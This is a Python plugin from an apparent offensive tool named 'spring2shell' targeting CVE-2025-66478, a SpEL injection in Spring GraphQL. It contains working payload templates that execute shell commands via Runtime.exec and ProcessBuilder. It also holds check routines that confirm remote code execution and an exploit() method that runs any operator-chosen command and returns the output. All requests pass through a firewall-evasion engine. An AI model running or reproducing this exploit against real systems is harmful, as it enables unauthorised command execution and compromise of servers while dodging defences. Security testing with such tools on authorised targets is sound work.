"""
Plugin for CVE-2025-66478: Spring GraphQL SpEL Injection.
"""

from __future__ import annotations

import random
from typing import TYPE_CHECKING, Any

from spring2shell.core.reporter import build_finding
from spring2shell.evasion.waf_engine import waf_engine
from spring2shell.plugins.base import BasePlugin
from spring2shell.utils.auth import audit_log, rate_limit_acquire

if TYPE_CHECKING:
    import requests


class CVE_2025_66478_Plugin(BasePlugin):
    """Spring GraphQL SpEL Injection (CVE-2025-66478) Plugin."""

    name = "cve_2025_66478"
    cve_id = "CVE-2025-66478"
    description = "GraphQL-specific SpEL injections — CVE-2025-66478"

    payload_templates = [
        '{"query":"mutation { execute(cmd: \\"{{T(java.lang.Runtime).getRuntime().exec(\\\\\\"COMMAND\\\\\\")}}\\") { result } }"}',
        '{"query":"query { system(cmd: \\"{{new java.lang.ProcessBuilder(\\\\\\"sh\\\\\\",\\\\\\"-c\\\\\\",\\\\\\"COMMAND\\\\\\").start()}}\\") }"}',
        '{"query":"{__schema { types { name fields { name args { defaultValue @export(as: \\"cmd\\") } } } } }","variables":{"cmd":"{{T(java.lang.Runtime).getRuntime().exec(\\"COMMAND\\")}}"}',
    ]

    def check(
        self,
        session: requests.Session,
        target: str,
        endpoint: str,
        headers: dict[str, str],
    ) -> dict[str, Any] | None:
        marker = f"RCE_{random.randint(100000, 999999)}"
        test_cmd = f"echo {marker}"
        content_types = ["application/json", "application/graphql+json"]

        for payload_template in self.payload_templates:
            payload = payload_template.replace("COMMAND", test_cmd)
            for ct in content_types:
                req_headers = headers.copy()
                req_headers["Content-Type"] = ct
                payload, req_headers = waf_engine.apply(payload, req_headers)

                try:
                    rate_limit_acquire()
                    resp = session.post(endpoint, data=payload, headers=req_headers, timeout=5)
                    audit_log("POST", endpoint, resp.status_code, payload[:100], "cve_scan")

                    if resp.status_code in (200, 400, 500) and marker in resp.text:
                        return build_finding(
                            url=target,
                            endpoint=endpoint,
                            status="confirmed",
                            cve=self.cve_id,
                            confidence="high",
                            reason="CVE_2025_66478_CONFIRMED",
                            evidence=f"Reflected command execution marker '{marker}' in response.",
                            payload=payload,
                            method="POST",
                            status_code=resp.status_code,
                            framework="Spring GraphQL",
                        )
                except Exception:
                    continue
        return None

    async def async_check(
        self,
        session: Any,
        target: str,
        endpoint: str,
        headers: dict[str, str],
    ) -> dict[str, Any] | None:
        import aiohttp

        if not isinstance(session, aiohttp.ClientSession):
            return await super().async_check(session, target, endpoint, headers)

        import random

        from spring2shell.utils.async_network import send_async_request
        from spring2shell.utils.auth import audit_log

        marker = f"RCE_{random.randint(100000, 999999)}"
        test_cmd = f"echo {marker}"
        content_types = ["application/json", "application/graphql+json"]

        for payload_template in self.payload_templates:
            payload = payload_template.replace("COMMAND", test_cmd)
            for ct in content_types:
                req_headers = headers.copy()
                req_headers["Content-Type"] = ct
                payload, req_headers = waf_engine.apply(payload, req_headers)

                try:
                    resp = await send_async_request(
                        session, "POST", endpoint, data=payload, headers=req_headers, timeout=5
                    )
                    async with resp:
                        text = await resp.text()
                        status = resp.status
                        audit_log("POST", endpoint, status, payload[:100], "cve_scan")

                        if status in (200, 400, 500) and marker in text:
                            return build_finding(
                                url=target,
                                endpoint=endpoint,
                                status="confirmed",
                                cve=self.cve_id,
                                confidence="high",
                                reason="CVE_2025_66478_CONFIRMED",
                                evidence=f"Reflected command execution marker '{marker}' in response.",
                                payload=payload,
                                method="POST",
                                status_code=status,
                                framework="Spring GraphQL",
                            )
                except Exception:
                    continue
        return None

    def exploit(
        self,
        session: requests.Session,
        target: str,
        endpoint: str,
        headers: dict[str, str],
        command: str,
    ) -> str | None:
        content_types = ["application/json", "application/graphql+json"]
        for payload_template in self.payload_templates:
            payload = payload_template.replace("COMMAND", command)
            for ct in content_types:
                req_headers = headers.copy()
                req_headers["Content-Type"] = ct
                payload, req_headers = waf_engine.apply(payload, req_headers)

                try:
                    resp = session.post(endpoint, data=payload, headers=req_headers, timeout=8)
                    if resp.status_code in (200, 400, 500) and resp.text:
                        return resp.text
                except Exception:
                    continue
        return None
